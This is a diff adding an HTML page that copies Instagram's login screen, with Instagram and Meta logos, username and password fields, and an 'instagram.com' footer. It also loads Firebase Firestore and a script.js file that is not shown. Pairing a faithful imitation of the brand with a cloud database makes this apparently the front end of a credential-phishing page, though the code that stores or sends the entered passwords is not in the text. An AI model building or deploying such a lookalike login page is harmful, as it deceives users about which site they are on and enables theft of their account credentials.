@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram Login</title>
+  
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram Login UI Clone</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: url('https://i.imgur.com/GlX6SLP.jpg') no-repeat center center/cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: white;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      height: 100vh;
+    }
+
+    .logo {
+      margin-top: 20px;
+      margin-bottom: 40px;
+    }
+
+    .logo img {
+      width: 100px;
+      height: 100px;
+    }
+
+    .form-input {
+      width: 100%;
+      max-width: 360px;
+      height: 60px;
+      background: rgba(0, 0, 0, 0.3);
+      border: 1px solid #aaa;
+      border-radius: 8px;
+      margin-bottom: 16px;
+      padding: 0 16px;
+      font-size: 16px;
+      color: white;
+    }
+
+    .form-input::placeholder {
+      color: #888;
+      font-size: 14px;
+    }
+
+    .login-button {
+      width: 100%;
+      max-width: 360px;
+      height: 50px;
+      background-color: #2563eb;
+      border: none;
+      border-radius: 25px;
+      font-size: 18px;
+      font-weight: bold;
+      color: white;
+      margin-top: 8px;
+      cursor: pointer;
+    }
+
+    .login-button:hover {
+      background-color: #1e4fc1;
+    }
+
+    .forgot {
+      text-align: center;
+      font-size: 16px;
+      margin-top: 16px;
+      color: #fff;
+    }
+
+    .create-account {
+      margin-top: 32px;
+      width: 100%;
+      max-width: 360px;
+    }
+
+    .create-account button {
+      width: 100%;
+      height: 50px;
+      border: 2px solid #0095f6;
+      background: transparent;
+      color: #0095f6;
+      border-radius: 25px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .create-account button:hover {
+      background: rgba(0, 149, 246, 0.1);
+    }
+
+    .meta {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .meta img {
+      width: 80px;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 14px;
+      color: #888;
+      margin-top: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://i.imgur.com/cmF4Eso.png" alt="Instagram Logo">
+    </div>
+    <form id="loginForm">
+      <input
+        class="form-input"
+        id="username"
+        type="text"
+        placeholder="Username, email or mobile number"
+        required
+      />
+      <input
+        class="form-input"
+        id="password"
+        type="password"
+        placeholder="Password"
+        required
+      />
+      <button type="submit" class="login-button">Log in</button>
+    </form>
+    <div class="forgot">Forgot password?</div>
+    <div class="create-account">
+      <button>Create new account</button>
+    </div>
+    <div class="meta">
+      <img src="https://i.imgur.com/U2HgDJH.png" alt="Meta Logo">
+    </div>
+    <div class="footer">instagram.com</div>
+  </div>
+  <script src="script.js"></script>
+</body>
+</html>
+<!-- partial -->
+  <script src='https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js'></script>
+<script src='https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js'></script><script  src="./script.js"></script>
+
+</body>
+</html>
